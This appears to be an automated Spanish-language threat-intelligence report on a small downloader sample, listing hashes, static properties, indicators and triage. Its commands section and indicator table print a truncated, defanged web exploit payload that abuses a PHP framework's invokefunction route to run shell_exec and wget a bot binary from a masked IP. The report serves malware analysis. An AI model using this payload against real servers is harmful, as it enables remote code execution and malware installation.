# 🧬 Payload Analysis

`c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582`

## 📌 Resumen

Texto ASCII de 369 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `kaizen.x86_64` en `hxxp://176.65.149.XXX/bins/kaizen.x86_64`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582.md](../../../../../malware-like/oraculo/downloader/c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:38:23.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582`
- **SHA1:** `3cf4bde4943f0ff3e0064d23326a1e12cbc913cb`
- **MD5:** `ebe8ef12a63df8976e5f42db6543df44`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 369 B |
| Entropía | 5.4 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)
- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget hxxp://176.65.149.XXX/bins/kaizen.x8
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://176.65.149.XXX/bins/kaizen.x86_64 | strings |
| url | hxxp://176.65.149.XXX/bins/kaizen.x86 | strings |
| ip | 176.65.149.XXX | static_analysis |
| command | pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget hxxp://176.65.149.XXX/bins/kaizen.x8 | strings |
| hash | c9133c595aa8bdf0db6686f4b9ef9920d97bbec33714559b8158eb8d9d5e2582 | static_analysis |
| ip | 115.227.26.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
